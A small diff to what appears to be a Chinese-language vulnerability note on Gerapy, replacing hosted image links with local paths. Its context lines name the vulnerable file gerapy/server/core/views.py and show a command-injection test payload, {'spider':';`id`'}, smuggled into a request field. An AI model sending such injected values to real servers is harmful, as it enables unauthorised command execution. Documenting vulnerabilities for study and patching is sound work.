@@ -20,11 +20,11 @@ title="Gerapy"
 
 登录页面
 
-![image-20220524145144051](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241451094.png)
+![image-20220524145144051](./images/202205241451094.png)
 
 出现漏洞的文件为 `gerapy/server/core/views.py`
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241451220.png)
+![](./images/202205241451220.png)
 
 构造请求包测试命令执行
 
@@ -43,4 +43,4 @@ Content-Length: 18
 {"spider":";`id`"}
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241452592.png)
+![](./images/202205241452592.png)
